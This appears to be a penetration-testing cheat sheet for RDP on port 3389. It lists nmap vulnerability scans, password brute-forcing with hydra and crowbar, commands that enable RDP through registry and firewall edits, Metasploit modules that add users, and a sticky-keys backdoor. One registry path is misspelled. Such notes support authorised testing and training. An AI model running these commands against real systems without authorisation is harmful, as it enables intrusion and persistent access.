# Port 3389 - RDP

### RDP Pentesting&#x20;

### Nmap&#x20;

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $RHOST
```
{% endcode %}

### Connection

```bash
# Workgroup machine
xfreerdp /u:ariah /v:$RHOST +clipboard
rdesktop -u ariah -p NowiseSloopTheory $RHOST

# Domain joined machine
xfreerdp /u:CORP\\iptracej /v:192.168.128.10 +clipboard
rdesktop -d corp -u iptracej 192.168.128.10
```

### Brute force

```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

### Enable RDP

{% code overflow="wrap" %}
```bash
# Method 1

CMD> netsh firewall set service RemoteDesktop enable
CMD> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
CMD> reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
CMD> sc config TermService start= auto
CMD> net start Termservice
CMD> netsh.exe

CMD> add portopening TCP 3389 "Remote Desktop"

# Method2

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=tcp

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=udp

# Method3

msf6> run post/windows/manage/enable_rdp
msf6> set username iptracej
msf6> set password iptracej
msf6> set session 1
msf6> exploit 
# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/ 
meterpreter> run getgui -e -u iptracej -p iptracej

# Sticky key to elevate to Administrative Privilege
# https://www.hackingarticles.in/remote-desktop-penetration-testing-port-3389/
msf6> use post/windows/manage/sticky_keys
msf6> set session 1
msf6> exploit
```
{% endcode %}
